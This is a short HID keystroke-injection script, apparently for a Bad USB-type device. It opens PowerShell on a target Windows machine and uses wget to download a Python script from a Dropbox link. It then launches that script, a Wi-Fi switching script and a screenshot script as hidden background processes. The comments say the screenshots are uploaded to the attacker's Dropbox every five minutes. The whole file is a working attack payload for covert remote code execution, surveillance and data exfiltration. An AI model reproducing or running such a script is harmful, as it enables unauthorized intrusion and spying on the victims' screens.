// Aashish Aryal
// HID script to download download_dropbox.py and run it via attacker's machine on target machine
// The download_dropbox.py script then downloads the rest of the scripts.
// This HID script then runs switch_wifi.py to switch network of the target machine.
// Then gets the new ip-address of the target machine after switching network.
// Finally, it runs screenshot.py to take a screenshot of the target machine and upload them to attacker's dropbox every 5 minutes.

layout("US")
delay(500)
press("GUI r") // Open Run dialog
delay(500)
type("powershell") // Run PowerShell
press("ENTER")
delay(2000)
type("cd system_files") // Go to working directory
press("ENTER")
delay(500)
type('wget "https://www.dropbox.com/scl/fi/x4mvx0wc4epa9g3lug2vj/download_dropbox.py?rlkey=f76fhl9769c0n7cgfr6nbag3h&st=pfq90otv&dl=1" -O download_dropbox.py') // Download download_dropbox.py
press("ENTER")
delay(2000)
type("Start-Process python download_dropbox.py -WindowStyle Hidden") // Run download_dropbox.py in the background
press("ENTER")
delay(5000)
type("Start-Process python switch_wifi.py -WindowStyle Hidden") // Run switch_wifi.py in the background 
press("ENTER")
delay(2000)
type("ipconfig") // Get IP address of the target after switching network
press("ENTER")
delay(1500)
type("Start-Process python screenshot.py -WindowStyle Hidden") // Run screenshot.py in the background
press("ENTER")
delay(1500)
type('exit')
delay(500)
press("ENTER")
